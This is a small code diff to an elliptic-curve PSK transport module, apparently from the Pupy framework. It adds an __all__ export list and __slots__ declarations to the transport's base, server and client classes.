@@ -2,6 +2,8 @@
 
 """ EC4 PSK transport """
 
+__all__ = ( 'ECMTransportServer', 'ECMTransportClient' )
+
 from ..base import BasePupyTransport
 from ...lib.picocmd.ecpv import ECPV
 
@@ -18,6 +20,13 @@ from Crypto.Random import get_random_bytes
 from hashlib import sha384
 
 class ECMTransport(BasePupyTransport):
+    __slots__ = (
+        'encryptor', 'decryptor',
+        'up_buffer', 'dec_buffer',
+        'nonce', 'key', 'chunk_len',
+        'need_validation', 'encoder'
+    )
+
     privkey = None
     pubkey  = None
 
@@ -164,9 +173,11 @@ class ECMTransport(BasePupyTransport):
             data.write_to(self.up_buffer)
 
 class ECMTransportServer(ECMTransport):
-    pass
+    __slots__ = ()
 
 class ECMTransportClient(ECMTransport):
+    __slots__ = ()
+
     def on_connect(self):
         req = self.encoder.generate_kex_request()
         self.nonce = get_random_bytes(16)
